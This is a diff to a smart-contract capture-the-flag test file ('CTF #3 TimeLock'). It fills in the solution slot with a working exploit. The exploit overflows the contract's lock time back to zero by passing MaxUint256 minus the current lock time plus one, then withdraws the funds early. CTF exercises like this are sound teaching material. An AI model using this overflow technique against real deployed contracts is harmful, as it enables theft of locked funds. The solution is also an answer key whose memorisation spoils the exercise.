@@ -16,7 +16,9 @@ describe('CTF #3 TimeLock', function () {
 
   it('Should recover all funds', async function () {
     // Your code goes here
-
+    let locktime = await challengeInstance.lockTime(user.address);
+    await challengeInstance.connect(user).increaseLockTime(ethers.constants.MaxUint256.sub(locktime).add(1));
+    await challengeInstance.connect(user).withdraw();
     expect(await challengeInstance.balances(user.address)).to.equal('0');
   });
 });
